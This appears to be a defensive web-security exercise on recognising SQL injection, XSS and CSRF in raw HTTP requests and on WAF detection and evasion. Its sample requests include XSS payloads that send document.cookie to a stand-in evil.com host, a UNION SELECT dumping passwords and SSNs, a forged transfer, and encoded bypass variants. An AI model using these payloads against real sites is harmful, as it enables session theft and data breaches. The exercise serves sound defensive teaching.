# Exercise 01: Attack Payload Recognition

**Type:** Conceptual
**Time:** 15 minutes
**Difficulty:** Easy

## Objective

Learn to identify SQL injection, XSS, and CSRF attack payloads in raw HTTP requests. Understand how each attack type exploits different trust boundaries and why pattern-based detection is the foundation of WAF rules.

## Scenario

Your WAF has captured the following raw HTTP requests hitting your application. Each one contains an attack payload. Your job is to identify the attack type, explain how it works, and determine what damage it could cause.

---

### Part A: Classify the Attack Payloads

For each request below, identify the attack type (SQLi, XSS, or CSRF) and explain the payload.

**Request 1:**
```http
GET /api/users?name=admin'--&email=test@test.com HTTP/1.1
Host: app.example.com
Cookie: session=abc123
```

**Request 2:**
```http
POST /api/comments HTTP/1.1
Host: app.example.com
Content-Type: application/json
Cookie: session=abc123

{"comment": "Great article! <script>fetch('https://evil.com/steal?c='+document.cookie)</script>"}
```

**Request 3:**
```http
POST /api/transfer HTTP/1.1
Host: bank.example.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=legit_user_456
Referer: https://evil-site.com/

to=attacker-account&amount=10000
```

**Request 4:**
```http
GET /api/search?q='+UNION+SELECT+username,password,ssn+FROM+users-- HTTP/1.1
Host: app.example.com
Cookie: session=abc123
```

**Request 5:**
```http
POST /api/profile HTTP/1.1
Host: app.example.com
Content-Type: application/json
Cookie: session=abc123

{"bio": "Hello <img src=x onerror='new Image().src=\"https://evil.com/?\"+document.cookie'>"}
```

**Request 6:**
```http
GET /api/search?q=<svg/onload=alert('XSS')> HTTP/1.1
Host: app.example.com
Cookie: session=abc123
```

Fill in the table:

| Request | Attack Type | Payload Location | What the Payload Does | Potential Damage |
|---------|------------|------------------|----------------------|-----------------|
| 1 | ? | ? | ? | ? |
| 2 | ? | ? | ? | ? |
| 3 | ? | ? | ? | ? |
| 4 | ? | ? | ? | ? |
| 5 | ? | ? | ? | ? |
| 6 | ? | ? | ? | ? |

<details><summary>Hint 1: SQL injection indicators</summary>

Look for SQL keywords and syntax in user-controlled input: single quotes (`'`), SQL comments (`--`, `#`), UNION SELECT, OR/AND conditions, semicolons. SQL injection manipulates the query structure by breaking out of a string context.

</details>

<details><summary>Hint 2: XSS indicators</summary>

Look for HTML/JavaScript tags and event handlers in user-controlled input: `<script>`, `<img onerror=...>`, `<svg onload=...>`, `javascript:` protocol, `document.cookie`, `fetch()`, `XMLHttpRequest`. XSS injects executable content into pages viewed by other users.

</details>

<details><summary>Hint 3: CSRF indicators</summary>

CSRF does not have a specific payload pattern. Instead, look for state-changing requests (POST, PUT, DELETE) that lack anti-CSRF tokens and originate from or reference an external site. The Referer header pointing to an external domain is a strong indicator.

</details>

---

### Part B: Map Payloads to WAF Detection Strategies

For each attack type, describe what a WAF should inspect and what patterns it should match.

| Attack Type | What to Inspect | Detection Patterns | Limitations |
|-------------|----------------|-------------------|-------------|
| SQL Injection | ? | ? | ? |
| XSS | ? | ? | ? |
| CSRF | ? | ? | ? |

<details><summary>Hint</summary>

SQL injection detection focuses on query parameters and request bodies for SQL syntax. XSS detection focuses on HTML/JavaScript patterns in all user-controllable fields. CSRF detection is different -- it relies on checking for anti-CSRF tokens rather than payload patterns.

</details>

---

### Part C: Identify Evasion Techniques

Attackers use encoding and obfuscation to bypass WAF rules. For each evasion technique below, decode the payload and identify the original attack.

| # | Obfuscated Payload | Encoding Used | Decoded Attack | Attack Type |
|---|-------------------|---------------|----------------|-------------|
| 1 | `%27%20OR%201%3D1%20--` | ? | ? | ? |
| 2 | `<script>alert(String.fromCharCode(88,83,83))</script>` | ? | ? | ? |
| 3 | `%3Csvg%20onload%3Dalert(1)%3E` | ? | ? | ? |
| 4 | `' OR 1=1#` (using MySQL comment syntax) | ? | ? | ? |
| 5 | `<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;(1)">` | ? | ? | ? |

<details><summary>Hint</summary>

URL encoding uses `%XX` for each character. HTML entities use `&#NNN;` or `&#xHH;`. `String.fromCharCode()` constructs strings from character codes. Comment syntax varies: `--` (SQL Server, PostgreSQL), `#` (MySQL), `/* */` (all). A good WAF must normalize input before pattern matching.

</details>

## Success Criteria

- [ ] All 6 requests correctly classified by attack type
- [ ] Each payload explanation describes the specific mechanism of the attack
- [ ] Detection strategies cover the correct inspection points for each attack type
- [ ] All 5 obfuscated payloads correctly decoded
- [ ] Can explain why WAFs must normalize/decode input before matching patterns

## What You Should Understand After This Exercise

- SQL injection exploits string concatenation in database queries to alter query logic
- XSS exploits the trust a user's browser has in content from your domain
- CSRF exploits the trust your server has in requests that carry valid session cookies
- Attackers use encoding, obfuscation, and alternative syntax to bypass simple pattern matching
- Effective WAF rules must account for evasion techniques by normalizing input before inspection
